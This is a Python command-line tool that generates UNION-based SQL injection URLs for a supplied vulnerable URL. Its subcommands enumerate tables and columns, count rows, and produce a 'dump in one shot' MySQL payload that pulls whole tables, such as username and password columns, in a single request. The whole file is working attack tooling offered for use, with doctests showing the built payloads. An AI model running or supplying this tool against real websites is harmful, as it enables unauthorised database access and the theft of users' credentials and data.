#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""Build SQLi URL"""
import argparse
import itertools
import logging
import sys
from abc import ABC, abstractmethod
from dataclasses import dataclass
from functools import partial
from typing import Optional, Sequence
from urllib.parse import quote

__version__ = '0.1.0'

logger = logging.getLogger(__name__)


def hexify(s: str) -> str:
    return '0x' + s.encode().hex()


def build_func(name: str, parts: Sequence[str]) -> str:
    """
    >>> build_func('concat', ['current_user()', hexify(':'), 'database()'])
    'concat(current_user(),0x3a,database())'
    """
    return f"{name}({','.join(parts)})"


build_concat = partial(build_func, 'concat')


def build_select_seq(
    seqsize: int, dest: Optional[int] = None, sql: Optional[str] = None,
) -> str:
    """
    >>> build_select_seq(15, 3, 'database()')
    'select 0,1,2,database(),4,5,6,7,8,9,10,11,12,13,14,15'
    """
    return 'select ' + ','.join(
        [sql if dest == i else str(i) for i in range(1, seqsize + 1)]
    )


def build_dios(
    table: str,
    columns: Sequence[str],
    column_delim: str = '\t',
    row_delim: str = '<br>',
) -> str:
    """
    >>> build_dios('users', ['username', 'password'])
    '(select(@a)from(select(@a:=0x00),(select(@a)from(users)where(table_schema<>0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=concat(@a,coalesce(username,0x00),0x09,coalesce(password,0x00),0x3c62723e))))a)'
    """

    def coalesce(c: str) -> str:
        return build_func('coalesce', [c, '0x00'])

    return (
        '(select(@a)from(select(@a:=0x00),(select(@a)from('
        + table
        + ')where(table_schema<>'
        + hexify('information_schema')
        + ')and(@a)in(@a:='
        + build_concat(
            [
                '@a',
                coalesce(columns[0]),
                *itertools.chain(
                    *([hexify(column_delim), coalesce(c)] for c in columns[1:])
                ),
                hexify(row_delim),
            ]
        )
        + ')))a)'
    )


def build_sqli_url(
    url: str,
    seqsize: int,
    dest: Optional[int] = None,
    sql: Optional[str] = None,
) -> str:
    return url + quote(
        ' union all ' + build_select_seq(seqsize, dest, sql) + ' -- -'
    )


def count_handler(args: argparse.Namespace) -> None:
    print(
        build_sqli_url(
            args.url,
            args.seqsize,
            args.dest,
            f'(select count(*) from {args.table})',
        )
    )


def list_tables_handler(args: argparse.Namespace) -> None:
    print(
        build_sqli_url(
            args.url,
            args.seqsize,
            args.dest,
            '(select group_concat(table_name) from information_schema.tables where table_schema=database())',
        )
    )


def list_columns_handler(args: argparse.Namespace) -> None:
    print(
        build_sqli_url(
            args.url,
            args.seqsize,
            args.dest,
            f'(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name={hexify(args.table)})',
        )
    )


def dios_handler(args: argparse.Namespace) -> None:
    print(
        build_sqli_url(
            args.url,
            args.seqsize,
            args.dest,
            build_dios(
                args.table, args.columns, args.column_delim, args.row_delim
            ),
        )
    )


def default_handler(args: argparse.Namespace) -> None:
    print(build_sqli_url(args.url, args.seqsize))


def parse_cmdline(argv: Sequence[str]) -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument(
        '-v',
        '--verbosity',
        action='count',
        default=0,
        help='increase output verbosity: 0 - warning, 1 - info, 2 - debug',
    )
    parser.add_argument(
        '-s',
        '--seqsize',
        help='union select sequence size',
        required=True,
        type=int,
    )
    parser.add_argument(
        '-d',
        '--dest',
        help='destination in union select sequence',
        required=True,
        type=int,
    )
    parser.add_argument(
        '--version', action='version', version=f'v{__version__}'
    )
    parser.add_argument('url', help='vulnarable url')
    parser.set_defaults(handler=default_handler)
    subparsers = parser.add_subparsers(dest='subparser_name')
    list_tables_parser = subparsers.add_parser('list-tables')
    list_tables_parser.set_defaults(handler=list_tables_handler)
    list_columns_parser = subparsers.add_parser('list-columns')
    list_columns_parser.add_argument('table', help='table name')
    list_columns_parser.set_defaults(handler=list_columns_handler)
    count_parser = subparsers.add_parser('count')
    count_parser.add_argument('table', help='table name')
    count_parser.set_defaults(handler=count_handler)
    dios_parser = subparsers.add_parser('dios', help='dump in one shot')
    dios_parser.add_argument('table', help='table name')
    dios_parser.add_argument('columns', help='column list', nargs='+')
    dios_parser.add_argument(
        '--column-delim', help='column delimiter', default='\t'
    )
    dios_parser.add_argument(
        '--row-delim', help='row delimiter', default='<br>'
    )
    dios_parser.set_defaults(handler=dios_handler)
    return parser.parse_args(argv)


def main(argv: Sequence[str] = sys.argv[1:]) -> None:
    logging.basicConfig(stream=sys.stderr)
    args = parse_cmdline(argv)
    levels = [logging.WARNING, logging.INFO, logging.DEBUG]
    level = levels[min(args.verbosity, len(levels) - 1)]
    logger.setLevel(level)
    logger.debug(args)
    try:
        args.handler(args)
    except SystemExit as ex:
        return ex.code
    except KeyboardInterrupt:
        logger.critical('Bye!')
    except Exception as e:
        logger.exception(e)


if __name__ == '__main__':
    sys.exit(main())
